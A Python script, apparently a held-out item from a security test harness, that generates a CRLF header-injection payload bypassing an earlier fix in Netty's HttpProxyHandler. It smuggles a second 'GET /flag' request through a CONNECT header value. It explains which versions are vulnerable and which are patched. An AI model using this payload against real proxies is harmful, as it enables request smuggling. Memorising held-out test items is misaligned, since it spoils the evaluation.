#!/usr/bin/env python3
"""[HELD-OUT] CVE-2026-42578 residual for netty-cve-2026-42578 (REAL-APP / EXTERNAL-HTTP form).

CVE-2025-67735's fix added request-line validation (HttpUtil.validateRequestLineTokens in
DefaultHttpRequest) and enabled header validation by DEFAULT through DefaultHttpHeadersFactory --
but HttpProxyHandler explicitly OPTS OUT of that fix. Its newInitialMessage() builds the CONNECT
request with:

    HttpHeadersFactory headersFactory =
        DefaultHttpHeadersFactory.headersFactory().withValidation(false);   // <- opt-out
    ...
    if (outboundHeaders != null) req.headers().add(outboundHeaders);        // <- no CRLF check

So the attacker moves the SAME CRLF split out of the request URI (blocked on V1) and into a
CONNECT proxy header VALUE. Delivered RAW (CRLF preserved) in the POST body of an EXTERNAL HTTP
request to the real Netty app's own `/proxyfetch` endpoint; the app forwards it and adds it as the
value of an outbound CONNECT header via the REAL HttpProxyHandler pointed at the SEPARATE sidecar:

    outbound.add("X-Forwarded-For", "1.2.3.4\\r\\nGET /flag?n=<nonce> HTTP/1.1\\r\\nX-Junk: 1")
    new HttpProxyHandler(sidecarAddr, outbound)   // transport connects to the sidecar (the proxy)

On V1 (4.1.129.Final..4.1.132.Final) the CRLF in the header value survives serialization by the
REAL HttpProxyHandler codec -> a second "GET /flag" request line splits off in the CONNECT bytes on
the wire -> the sidecar records the planted flag (REACHES on V1). On V2 (4.1.133.Final, CVE-2026-
42578 patched) HttpProxyHandler defaults validateInitialHeaders=true, so req.headers().add(outbound)
validates the value and THROWS (prohibited char 0x0d) -> the handshake fails, no bytes are sent ->
BLOCKED.

Same flag channel as the seed (a smuggled "GET /flag" request line reaching the sidecar); the
residual only changes WHERE the tainted CRLF enters (a CONNECT proxy header value via the un-
validated HttpProxyHandler path), so it survives the request-line-only CVE-2025-67735 fix.
"""
import secrets


# One residual vector: CRLF in the HttpProxyHandler outbound CONNECT header value.
VECTORS = [
    {"id": "cve-2026-42578-connect-header-crlf",
     "endpoint": "/proxyfetch",
     "hdr": "1.2.3.4\r\nGET /flag?n={nonce} HTTP/1.1\r\nX-Junk: 1"},
]


def candidate(vec):
    return {
        "id": vec["id"],
        "mode": "bypass",
        "endpoint": vec["endpoint"],
        "hdr": vec["hdr"],
        "nonce": "byp" + secrets.token_hex(6),
    }


if __name__ == "__main__":
    import json
    print(json.dumps([candidate(v) for v in VECTORS], indent=2))
